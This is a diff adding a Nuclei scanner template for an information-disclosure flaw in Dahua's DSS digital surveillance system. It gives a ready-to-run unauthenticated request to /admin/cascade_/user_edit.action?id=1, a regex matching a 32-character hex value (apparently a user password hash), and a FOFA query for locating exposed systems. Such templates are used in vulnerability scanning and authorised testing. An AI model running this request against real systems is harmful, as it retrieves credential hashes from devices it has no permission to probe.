@@ -1,0 +1,33 @@
+id: DH-DSS-user_edit_action-Information-disclosure
+
+info:
+  name: 大华 DSS 数字监控系统user_edit.action 信息泄露
+  author: onewin
+  severity: high
+  description: 大华 DSS 数字监控系统user_edit.action 信息泄露
+  metadata:
+    fofa-query: app="dahua-DSS"
+  tags: dahua
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: regex
+      part: body
+      regex:
+        - '[0-9a-f]{32}'
+      condition: and
+
+
